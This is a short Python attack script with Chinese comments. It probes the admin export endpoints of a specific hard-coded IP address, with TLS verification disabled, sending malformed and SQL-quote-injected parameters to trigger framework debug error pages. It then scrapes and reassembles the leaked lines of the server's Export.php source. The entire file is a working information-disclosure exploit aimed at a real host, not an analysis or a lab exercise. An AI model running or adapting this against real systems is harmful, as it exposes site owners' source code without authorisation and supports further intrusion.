#!/usr/bin/env python3
"""tp_src_full.py - 滚动泄露Export.php完整源码"""
import urllib.request, ssl, re

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'https://139.196.199.221'

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(300000).decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read(300000).decode('utf-8', 'ignore')
    except Exception:
        return 0, ''

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        lines[int(m.group(1))] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

all_lines = {}
triggers = [
    '/admin/export/goodslist.html?num=5&page=1',
    '/admin/export/goodslist.html?num=5&page=1&sort=x',
    '/admin/export/goodslist.html?num=5&page=1&title=1%27',
    '/admin/export/goodslist.html?num=5&page=1&field=1',
    '/admin/export/goodslist.html?num=5&page=1&status=999',
    '/admin/export/export.html?num=5',
    '/admin/export/index.html?num=5',
    '/admin/export/goodslist.html?num=abc',
    '/admin/export/goodslist.html?num=5&page=1&id=1%27',
    '/admin/export/goodslist.html?num=5&page=1&order=x',
]
for t in triggers:
    st, b = get(BASE + t)
    l = leak_lines(b)
    new = {k: v for k, v in l.items() if k not in all_lines}
    if new:
        print('%s: +%d new' % (t.split('?')[1], len(new)), flush=True)
        all_lines.update(new)

print()
print('=== Export.php 全部泄露行 ===')
for ln in sorted(all_lines):
    print('  %4d: %s' % (ln, all_lines[ln][:150]), flush=True)
print('=== DONE ===')
